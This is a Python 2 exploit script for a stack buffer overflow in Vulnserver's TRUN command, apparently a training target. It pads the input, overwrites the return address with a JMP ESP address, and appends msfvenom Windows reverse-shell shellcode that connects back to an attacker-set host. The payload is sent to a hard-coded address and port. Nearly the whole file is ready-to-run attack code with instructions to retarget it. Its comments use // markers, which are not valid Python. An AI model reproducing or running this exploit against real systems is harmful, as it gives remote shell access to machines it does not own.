//This is the Final Code of Buffer Overflow of the Vulnserver. 
//Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
//This script is based on python2

import sys, socket

buf = "TRUN /.:/"

//JMP ESP = 625011AF

buf += "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 10 

//msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00"

buf += b"\xba\xdb\x60\xb8\x29\xd9\xc0\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\x8d\x6e\x5a"
buf += b"\xdc\xcd\x87\x18\x1f\x2d\x58\x7d\xa9\xc8\x69\xbd\xcd"
buf += b"\x99\xda\x0d\x85\xcf\xd6\xe6\xcb\xfb\x6d\x8a\xc3\x0c"
buf += b"\xc5\x21\x32\x23\xd6\x1a\x06\x22\x54\x61\x5b\x84\x65"
buf += b"\xaa\xae\xc5\xa2\xd7\x43\x97\x7b\x93\xf6\x07\x0f\xe9"
buf += b"\xca\xac\x43\xff\x4a\x51\x13\xfe\x7b\xc4\x2f\x59\x5c"
buf += b"\xe7\xfc\xd1\xd5\xff\xe1\xdc\xac\x74\xd1\xab\x2e\x5c"
buf += b"\x2b\x53\x9c\xa1\x83\xa6\xdc\xe6\x24\x59\xab\x1e\x57"
buf += b"\xe4\xac\xe5\x25\x32\x38\xfd\x8e\xb1\x9a\xd9\x2f\x15"
buf += b"\x7c\xaa\x3c\xd2\x0a\xf4\x20\xe5\xdf\x8f\x5d\x6e\xde"
buf += b"\x5f\xd4\x34\xc5\x7b\xbc\xef\x64\xda\x18\x41\x98\x3c"
buf += b"\xc3\x3e\x3c\x37\xee\x2b\x4d\x1a\x67\x9f\x7c\xa4\x77"
buf += b"\xb7\xf7\xd7\x45\x18\xac\x7f\xe6\xd1\x6a\x78\x09\xc8"
buf += b"\xcb\x16\xf4\xf3\x2b\x3f\x33\xa7\x7b\x57\x92\xc8\x17"
buf += b"\xa7\x1b\x1d\xb7\xf7\xb3\xce\x78\xa7\x73\xbf\x10\xad"
buf += b"\x7b\xe0\x01\xce\x51\x89\xa8\x35\x32\x76\x84\x34\xea"
buf += b"\x1e\xd7\x36\xee\x0c\x5e\xd0\x84\xa0\x37\x4b\x31\x58"
buf += b"\x12\x07\xa0\xa5\x88\x62\xe2\x2e\x3f\x93\xad\xc6\x4a"
buf += b"\x87\x5a\x27\x01\xf5\xcd\x38\xbf\x91\x92\xab\x24\x61"
buf += b"\xdc\xd7\xf2\x36\x89\x26\x0b\xd2\x27\x10\xa5\xc0\xb5"
buf += b"\xc4\x8e\x40\x62\x35\x10\x49\xe7\x01\x36\x59\x31\x89"
buf += b"\x72\x0d\xed\xdc\x2c\xfb\x4b\xb7\x9e\x55\x02\x64\x49"
buf += b"\x31\xd3\x46\x4a\x47\xdc\x82\x3c\xa7\x6d\x7b\x79\xd8"
buf += b"\x42\xeb\x8d\xa1\xbe\x8b\x72\x78\x7b\xbb\x38\x20\x2a"
buf += b"\x54\xe5\xb1\x6e\x39\x16\x6c\xac\x44\x95\x84\x4d\xb3"
buf += b"\x85\xed\x48\xff\x01\x1e\x21\x90\xe7\x20\x96\x91\x2d"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

//RHOST = 192.168.1.13 (Change according to your IP)
//RPORT = 9000 (Change according to your Vulnerable service port)

s.connect(('192.168.1.13',9000))
print s.recv(1024)
s.send(buf)
s.close()
